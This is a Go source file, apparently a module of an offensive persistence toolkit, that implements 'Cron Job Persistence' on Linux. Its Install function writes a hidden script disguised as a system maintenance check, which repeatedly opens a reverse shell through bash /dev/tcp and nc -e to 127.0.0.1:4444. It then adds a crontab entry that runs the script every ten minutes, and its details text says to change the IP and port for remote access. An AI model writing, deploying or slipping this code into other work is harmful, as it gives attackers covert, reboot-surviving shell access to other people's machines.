//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
)

type CronJob struct {
	cronEntry string
}

func NewCronJob() Technique {
	return &CronJob{}
}

func (c *CronJob) Name() string {
	return "Cron Job Persistence"
}

func (c *CronJob) Description() string {
	return "Scheduled reverse shell via cron"
}

func (c *CronJob) StealthLevel() string {
	return "low"
}

func (c *CronJob) SurvivesReboot() bool {
	return true
}

func (c *CronJob) Install() error {
	// Create reverse shell script
	shellScript := `/tmp/.system-check.sh`
	reverseShell := `#!/bin/bash
# System maintenance script
while true; do
    (bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/dev/null || nc 127.0.0.1 4444 -e /bin/bash 2>/dev/null) &
    sleep 3600
done
`
	
	if err := os.WriteFile(shellScript, []byte(reverseShell), 0755); err != nil {
		return fmt.Errorf("create shell script: %w", err)
	}
	
	// Add cron job (every 10 minutes)
	c.cronEntry = "*/10 * * * * /tmp/.system-check.sh >/dev/null 2>&1"
	
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", c.cronEntry))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("add cron job: %w", err)
	}
	
	return nil
}

func (c *CronJob) Remove() error {
	// Remove the cron entry
	cmd := exec.Command("bash", "-c", "crontab -l | grep -v '.system-check.sh' | crontab -")
	cmd.Run() // Ignore errors
	
	// Remove the script
	os.Remove("/tmp/.system-check.sh")
	
	return nil
}

func (c *CronJob) Details() string {
	return `Cron job installed: */10 * * * * (every 10 minutes)
Script location: /tmp/.system-check.sh
Attempts reverse shell to 127.0.0.1:4444

Customize the target IP/port in the script for remote access.
`
}
